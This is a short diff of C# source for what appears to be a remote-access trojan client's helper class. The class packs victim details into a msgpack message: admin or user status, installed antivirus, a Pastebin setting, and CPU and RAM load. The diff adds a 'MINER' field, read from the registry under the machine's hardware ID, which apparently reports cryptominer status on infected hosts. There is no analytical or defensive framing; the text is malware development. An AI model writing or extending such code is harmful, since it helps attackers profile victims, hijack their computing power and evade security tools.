@@ -13,6 +13,7 @@ using System.Text;
 using System.Threading;
 using System.Drawing.Imaging;
 using System.Runtime.InteropServices;
+using System.Linq;
 
 namespace Client.Helper
 {
@@ -112,7 +113,7 @@ namespace Client.Helper
             msgpack.ForcePathObject("Version").AsString = Settings.Version;
             msgpack.ForcePathObject("Admin").AsString = IsAdmin().ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
             TheCPUCounter.NextValue();
-            msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
+            msgpack.ForcePathObject("Performance").AsString = $"MINER {SetRegistry.GetValue(Settings.Hwid) ?? "0"}   CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
             msgpack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
             msgpack.ForcePathObject("Antivirus").AsString = Antivirus();
             return msgpack.Encode2Bytes();
@@ -130,7 +131,6 @@ namespace Client.Helper
             }
             return null;
         }
-
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);
